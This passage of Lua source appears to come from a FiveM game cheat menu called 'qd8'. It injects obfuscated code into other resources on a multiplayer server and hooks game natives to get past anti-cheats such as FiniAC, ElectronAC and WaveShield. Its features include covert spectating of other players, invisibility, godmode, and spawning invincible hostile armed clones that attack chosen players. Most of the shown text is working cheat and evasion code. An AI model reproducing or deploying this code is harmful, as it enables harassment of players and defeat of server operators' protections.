                _G.qd8Spectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.qd8Spectate then _G.qd8Spectate = {} end
                _G.qd8Spectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.qd8Spectate.heading = myHeading
                _G.qd8Spectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.qd8Spectate.enabled = true
                _G.qd8Spectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.qd8Spectate.enabled = false
                    TriggerEvent('qd8:Notify', "error", "qd8", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.qd8Spectate.enabled = false
                    TriggerEvent('qd8:Notify', "error", "qd8", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.qd8Spectate.enabled = false
                    TriggerEvent('qd8:Notify', "error", "qd8", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.qd8Spectate and _G.qd8Spectate.enabled do
                        local cid = findClientIdByServerId(_G.qd8Spectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]], tostring(enabled), targetServerId)

        local fn, err = load(code)
        if fn then
            local success, result = pcall(fn)
            if not success then
                print("[ReaperV4 Spectate] Execution error:", result)
                self:Notify("error", "qd8", "Failed to execute spectate code!", 3000)
            else
                print("[ReaperV4 Spectate] Code executed successfully")
            end
        else
            print("[ReaperV4 Spectate] Load error:", err)
            self:Notify("error", "qd8", "Failed to load spectate code!", 3000)
        end
    else
        if GetResourceState('FiniAC') == 'started' or GetResourceState('ElectronAC') == 'started' then
            print('Spectate Fallback #1')
            MachoInjectResourceRaw("any", string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.qd8Spectate or not _G.qd8Spectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.qd8Spectate.back
                    local heading = _G.qd8Spectate.heading
                    local wasVisible = _G.qd8Spectate.wasVisible
                    if _G.qd8Spectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.qd8Spectate.camera, false)
                        _G.qd8Spectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.qd8Spectate.enabled = false
                    _G.qd8Spectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.qd8Spectate then _G.qd8Spectate = {} end
                    _G.qd8Spectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.qd8Spectate.heading = myHeading
                    _G.qd8Spectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.qd8Spectate.enabled = true
                    _G.qd8Spectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.qd8Spectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.qd8Spectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.qd8Spectate and _G.qd8Spectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.qd8Spectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]], tostring(enabled), targetServerId))
        else
            print('Spectate Fallback #2')
            MachoInjectResourceRaw("monitor", string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.qd8Spectate or not _G.qd8Spectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.qd8Spectate.back
                    local heading = _G.qd8Spectate.heading
                    local wasVisible = _G.qd8Spectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.qd8Spectate.enabled = false
                    _G.qd8Spectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.qd8Spectate then _G.qd8Spectate = {} end
                    _G.qd8Spectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.qd8Spectate.heading = myHeading
                    _G.qd8Spectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.qd8Spectate.enabled = true
                    _G.qd8Spectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.qd8Spectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.qd8Spectate and _G.qd8Spectate.enabled do
                            local cid = findClientIdByServerId(_G.qd8Spectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]], tostring(enabled), targetServerId))
        end
    end
end

local enviFallbackResources = {
    "envi-medic",
    "envi-hud",
    "envi-yoga",
    "envi-chopshop",
    "envi-chopshop-v2",
    "envi-foodtrucks",
    "envi-dumpsters",
    "envi-prescriptions",
    "envi-druglabs",
    "lation_laundering"
}

local function enviGetStartedFallbackResource()
    for i, res in ipairs(enviFallbackResources) do
        if GetResourceState(res) == "started" then
            return res
        end
    end
    return nil
end

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end

function qd8:EnableInvisibility()
    local function HookNative(nativeName, newFunction)
        local originalNative = _G[nativeName]
        if not originalNative or type(originalNative) ~= "function" then
            return
        end
        _G[nativeName] = function(...)
            return newFunction(originalNative, ...)
        end
    end
    
    HookNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
    HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
    HookNative("IsEntityVisible", function(originalFn, ...) return true end)
    HookNative("IsEntityVisibleToScript", function(originalFn, ...) return true end)
    HookNative("SetEntityVisible", function(originalFn, ped, toggle, unk)
        if _G.qd8Invisibility and _G.qd8Invisibility.enabled then
            return originalFn(ped, false, unk)
        end
        return originalFn(ped, toggle, unk)
    end)
    
    if not _G.qd8Invisibility then
        _G.qd8Invisibility = {
            enabled = false,
            wasVisible = true,
        }
    end
    if not _G.qd8Invisibility.enabled then
        _G.qd8Invisibility.enabled = true
        local ped = PlayerPedId()
        _G.qd8Invisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        CreateThread(function()
            while _G.qd8Invisibility and _G.qd8Invisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    end
end

function qd8:DisableInvisibility()
    if _G.qd8Invisibility and _G.qd8Invisibility.enabled then
        _G.qd8Invisibility.enabled = false
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityVisible(ped, _G.qd8Invisibility.wasVisible, false)
        end
    end
end

function qd8:HandleAttackClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end
    
    local playerIdsStr = table.concat(playerIds, ",")
    MachoHookNative(0x240A18690AE96513, function(modelHash)
        return true, modelHash
    end)
    
    MachoHookNative(0xD49F9B0955C367DE, function(model, x, y, z, heading, isNetwork, thisScriptCheck)
        return true, model, x, y, z, heading, isNetwork, thisScriptCheck
    end)
    
    MachoInjectResourceRaw("monitor", string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]], playerIdsStr))
end


function qd8:HandleGodmodeToggle(enabled)
    local waveShieldStarted = GetResourceState("WaveShield") == "started"
    local targetResource = GetResourceState("monitor") == "started" and "monitor" or (waveShieldStarted and "WaveShield" or "any")

    if waveShieldStarted then
        if enabled then
            qd8:Notify("success", "qd8", "Godmode Enabled (WaveShield)", 3000)
            Injection(targetResource, [[
                if not _G.qd8Godmode then _G.qd8Godmode = { enabled = false, originals = {} } end
                _G.qd8Godmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.qd8Godmode.originals[nativeName] then
                        _G.qd8Godmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.qd8Godmode and _G.qd8Godmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]])
        else
            qd8:Notify("error", "qd8", "Godmode Disabled (WaveShield)", 3000)
            Injection(targetResource, [[
                if not _G.qd8Godmode then _G.qd8Godmode = { enabled = false, originals = {} } end
                _G.qd8Godmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.qd8Godmode.originals[nativeName] then
                        _G.qd8Godmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.qd8Godmode and _G.qd8Godmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]])
        end
        return
    end

    -- Non-WaveShield branch
    if enabled then
        qd8:Notify("success", "qd8", "Godmode Enabled", 3000)
        MachoInjectResource2(3, "any", [[
            if not _G.qd8Godmode then _G.qd8Godmode = { enabled = false, originals = {} } end
            _G.qd8Godmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.qd8Godmode.originals[nativeName] then
                    _G.qd8Godmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.qd8Godmode and _G.qd8Godmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.qd8Godmode and _G.qd8Godmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.qd8Godmode and _G.qd8Godmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]])
    else
        qd8:Notify("error", "qd8", "Godmode Disabled", 3000)
        MachoInjectResource2(3, "any", [[
            if not _G.qd8Godmode then _G.qd8Godmode = { enabled = false, originals = {} } end
            _G.qd8Godmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.qd8Godmode.originals[nativeName] then
                    _G.qd8Godmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.qd8Godmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.qd8Godmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]])
    end
end



function qd8:SpawnSelectedVehicle(model, teleportInto, deletePrevious)
    if not model or model == "" then return end

    local ped = PlayerPedId()
    local currentVeh = GetVehiclePedIsIn(ped, false)
    local serverEndpoint = GetCurrentServerEndpoint()

    -- capture original coords/heading once so injected code can use literal numbers (avoid nil ogCoords inside injection)
    local ogCoords = GetEntityCoords(ped)
    local ogHeading = GetEntityHeading(ped)

    if GetResourceState("solos-rentals") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 1)", 3000)
        print("Creating Vehicle via Fallback #1")
        Injection("solos-rentals", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
